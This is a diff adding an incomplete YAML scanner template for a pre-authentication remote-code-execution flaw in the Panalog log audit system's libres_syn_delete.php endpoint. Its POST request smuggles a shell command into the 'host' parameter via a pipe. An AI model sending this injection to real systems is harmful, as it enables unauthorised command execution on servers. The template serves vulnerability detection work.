@@ -1,0 +1,22 @@
+id:
+info:
+  name: Panalog 日志审计系统 libres_syn_delete.php 前台RCE漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /content-apply/libres_syn_delete.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Accept-Encoding: gzip
+    Connection: close
+  data: |
+    token=1&id=2&host=|id >1.txt
+response1:
+  headers:
+  body: yes
+  code: 200
+requests2:
+response2:
